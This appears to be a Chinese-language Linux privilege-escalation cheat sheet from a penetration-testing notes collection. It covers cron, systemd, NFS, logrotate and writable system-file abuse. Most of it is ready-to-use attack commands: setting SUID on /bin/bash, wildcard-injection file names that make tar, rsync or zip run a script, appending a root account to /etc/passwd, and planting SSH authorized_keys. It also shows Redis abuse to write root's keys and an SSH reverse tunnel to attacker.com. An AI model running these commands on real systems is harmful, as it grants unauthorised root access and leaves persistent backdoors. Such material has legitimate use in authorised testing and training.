# Linux Cron/Service/NFS — 任务与服务劫持提权

> Cron 任务、systemd 服务、NFS 挂载——这些是管理员配置中最常出现疏忽的地方。一个可写的 cron 脚本、一个通配符注入点、一次 no_root_squash 的 NFS 访问，都等于 root。

## 关键词

`cron` `crontab` `cron.d` `systemd` `service` `systemctl` `通配符注入` `wildcard injection` `tar注入` `rsync注入` `chown注入` `NFS` `no_root_squash` `可写/etc/passwd` `可写/etc/shadow` `ssh authorized_keys` `LD_LIBRARY_PATH劫持` `Python库劫持` `PYTHONPATH` `logrotate` `定时任务劫持` `pspy`

---

## 1. Cron 任务劫持

### 1.1 枚举

```bash
# 全局 cron 配置
cat /etc/crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/

# 当前用户 cron
crontab -l 2>/dev/null

# 其他用户 cron（需 root）
ls -la /var/spool/cron/crontabs/

# 实时监控进程（发现隐藏/间歇 cron）
# 上传 pspy64: ./pspy64 -pf -i 1000

# 检查 cron 日志
grep CRON /var/log/syslog 2>/dev/null | tail -50
```

### 1.2 可写 cron 文件

```bash
# 找到可写 cron 文件/目录
find /etc/cron* -writable -type f 2>/dev/null
find /etc/cron* -writable -type d 2>/dev/null

# 可写 /etc/crontab → 直接加 root cron
echo '* * * * * root chmod u+s /bin/bash' >> /etc/crontab

# 可写 /etc/cron.d/ → 创建恶意 cron
echo '* * * * * root cp /bin/bash /tmp/bsh; chmod u+s /tmp/bsh' > /etc/cron.d/pwn

# 可写 cron.daily 脚本 → 编辑已有脚本追加
echo 'chmod u+s /bin/bash' >> /etc/cron.daily/existing_script
```

### 1.3 cron 脚本 PATH 劫持

```bash
# 场景: cron.daily 中有个 backup.sh
# cat backup.sh → 内容: tar czf /backup/daily.tar.gz *
# 其中的 tar 没写绝对路径 /bin/tar

# 如果脚本执行目录可写 → 创建恶意的 tar
echo '#!/bin/bash' > /path/to/cron/script/dir/tar
echo 'cp /bin/bash /tmp/bsh; chmod u+s /tmp/bsh' >> /path/to/cron/script/dir/tar
chmod +x /path/to/cron/script/dir/tar

# 修改 PATH 在脚本中生效
# cron 的默认 PATH: /usr/bin:/bin
# 如果脚本可写 → 编辑脚本 export PATH=/tmp:$PATH
```

### 1.4 Python 库劫持

```bash
# 场景: cron 执行 /opt/scripts/backup.py
# backup.py import 了某个第三方库
# 如果 python path 包含可写目录 → 劫持被 import 的模块

# 检查 Python 模块搜索路径
python3 -c "import sys; print('\n'.join(sys.path))"

# 如果 /tmp 或 /opt/scripts 在路径前面
# 创建恶意模块覆盖 import
# 例如 backup.py 的 import shutil:
echo 'import os; os.system("chmod u+s /bin/bash")' > /opt/scripts/shutil.py
```

### 1.5 通配符注入（Wildcard Injection）

```bash
# ====== 场景: cron 执行 tar czf /backup.tar.gz * ======
# 当前目录可控

# 创建 "文件名" 实际上是 tar 的参数
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh pwn.sh"

echo 'cp /bin/bash /tmp/bsh; chmod u+s /tmp/bsh' > pwn.sh
chmod +x pwn.sh

# cron 执行时: tar czf /backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh pwn.sh ...
# → pwn.sh 被 root 执行

# ====== 场景: chown 通配符 ======
# chown -R user:group *
# 攻击者创建:
touch -- "--reference=some_root_file"

# ====== 场景: rsync 通配符 ======
# rsync -a *.txt dest/
# 攻击者创建:
touch -- "-e sh pwn.sh"

# ====== 场景: zip ======
# zip /backup.zip *
touch -- "-T --unzip-command=sh pwn.sh"
```

**完整通配符注入矩阵：**

| 命令 | 注入参数 | 利用效果 |
|------|---------|---------|
| `tar cf a.tar *` | `--checkpoint=1` `--checkpoint-action=exec=sh x` | 命令执行 |
| `chown user *` | `--reference=root_file` | 修改引用文件所有者 |
| `rsync * dest/` | `-e sh x` | 命令执行 |
| `zip a.zip *` | `-T --unzip-command=sh x` | 命令执行 |
| `chmod 644 *` | `--reference=root_file` | 权限复制 |
| `mv * dest/` | (无法注入) | — |
| `cp * dest/` | (无法注入) | — |

---

## 2. Systemd 服务劫持

### 2.1 枚举

```bash
# 列出所有服务
systemctl list-units --type=service

# 找可写的 service 文件
find /etc/systemd/system/ /lib/systemd/system/ -writable -type f 2>/dev/null

# 检查服务配置中的 ExecStart
systemctl cat servicename
grep -r "ExecStart" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null

# 当前用户能否操作服务
systemctl show servicename | grep -i uid
```

### 2.2 利用

```bash
# ====== 可写 .service 文件 → 修改 ExecStart ======
vim /etc/systemd/system/vuln.service
# ExecStart=/bin/bash -c 'chmod u+s /bin/bash'
systemctl daemon-reload
systemctl restart vuln.service

# ====== 可重启服务 + 可写 ExecStart 指向的二进制 ======
# 如果 ExecStart=/opt/app/bin/start.sh
# 且 start.sh 可写 → 替换为恶意脚本

# ====== 服务以 root 运行但用户可控制相关文件 ======
# 如果 ExecStart=/opt/app/runner /opt/app/config.yml
# 且 config.yml 可写 → 有些 runner 支持 exec 指令

# ====== 未受保护的 systemctl 操作 ======
# 如果 sudo -l 包含: (root) NOPASSWD: /bin/systemctl
# → 等同于 root（见 01-linux-sudo-suid.md）
```

---

## 3. NFS 滥用

### 3.1 枚举

```bash
# 检查 NFS 导出
cat /etc/exports
showmount -e localhost 2>/dev/null
showmount -e NFS_SERVER_IP 2>/dev/null

# 当前 NFS 挂载
mount | grep nfs
df -h | grep nfs
```

### 3.2 no_root_squash 利用

```bash
# /etc/exports: /shared *(rw,no_root_squash)
# → NFS 客户端的 root 在 /shared 上也是 root

# 攻击机 (有 root 的机器):
mkdir /tmp/nfs
mount -t nfs TARGET_IP:/shared /tmp/nfs

# 在攻击机创建 SUID bash
cp /bin/bash /tmp/nfs/suidbash
chmod u+s /tmp/nfs/suidbash

# 在目标机上执行:
/shared/suidbash -p
# → root shell
```

### 3.3 NFS 弱权限

```bash
# 如果没有 no_root_squash 但 NFS 共享目录权限较宽:
# 检查共享目录的文件权限
ls -la /shared/

# 如果 /shared/ 有用户的 home 目录:
# 写入 SSH authorized_keys
mkdir -p /shared/username/.ssh
echo "ssh-rsa AAA... attacker@kali" >> /shared/username/.ssh/authorized_keys
# 如果目标允许 SSH 登录 → 直接以该用户登录

# 或覆盖 .bashrc 注入恶意启动命令
echo 'cp /bin/bash /tmp/bsh; chmod u+s /tmp/bsh' >> /shared/username/.bashrc
```

---

## 4. /etc/passwd 与 /etc/shadow 可写

```bash
# ====== 检查权限 ======
ls -la /etc/passwd /etc/shadow
# -rw-rw-rw- 或当前用户组成员可写

# ====== /etc/passwd 可写 → 添加 root 账户 ======
openssl passwd -1 -salt x password123
echo "pwnuser:\$1\$x\$.....:0:0:root:/root:/bin/bash" >> /etc/passwd
su pwnuser
# → root shell

# ====== /etc/shadow 可写 → 修改 root 密码 ======
openssl passwd -1 -salt x newpassword
# 生成 hash 后替换 root 行的第二个字段
# sed -i 's/^root:[^:]*:/root:$1$x$....:/' /etc/shadow
# su root

# ====== /etc/sudoers 可写 → 添加 sudo 权限 ======
echo "www-data ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo su

# ====== root SSH authorized_keys 可写 ======
# (如果 root 允许 SSH)
echo "ssh-rsa AAA..." >> /root/.ssh/authorized_keys
```

---

## 5. 内部端口与服务

### 5.1 枚举

```bash
# 列出监听端口
ss -tlnp
netstat -tlnp 2>/dev/null

# 只监听 127.0.0.1 的服务（内网服务）
ss -tlnp | grep 127.0.0.1

# 常见内网服务及其默认端口
# 6379 Redis
# 27017 MongoDB
# 3306 MySQL/MariaDB
# 5432 PostgreSQL
# 8080/8000 Web管理面板
# 9200 Elasticsearch
# 11211 Memcached
# 5000/5001 内部 API
```

### 5.2 端口转发访问内网服务

```bash
# ====== 如果目标有 python3 ======
python3 -c "
import socket,subprocess
s=socket.socket();s.bind(('0.0.0.0',8888));s.listen(1)
c,a=s.accept()
p=subprocess.Popen(['nc','127.0.0.1','6379'],stdin=c,stdout=c,stderr=c)
"

# ====== 或直接用 socat ======
./socat TCP-LISTEN:8888,reuseaddr,fork TCP:127.0.0.1:6379

# ====== SSH 反向端口转发 (如有 SSH) ======
ssh -R 8888:127.0.0.1:6379 user@attacker.com

# ====== 通过内部服务提权 ======
# Redis 127.0.0.1:6379 无密码:
# → CONFIG SET dir /root/.ssh → CONFIG SET dbfilename authorized_keys → SET key "SSH_PUBKEY" → SAVE
# → SSH 登录 root
```

---

## 6. Logrotate 等日志轮转劫持

```bash
# logrotate 可能在特定用户下运行，且处理可写目录的文件
# 如果 /etc/logrotate.d/ 可写 → 创建恶意配置:
echo '/tmp/pwn.log {
    daily
    size=1
    create 0777 root root
    postrotate
        chmod u+s /bin/bash
    endscript
}' > /etc/logrotate.d/pwn

# 触发: logrotate -f /etc/logrotate.d/pwn
```

---

## 7. 关联技术

- [[01-linux-sudo-suid]] — SUDO/SUID/Capabilities
- [[03-linux-kernel-cve]] — 内核漏洞提权
- [[05-container-escape]] — 容器逃逸
- [[00-overview]] — PE 全景
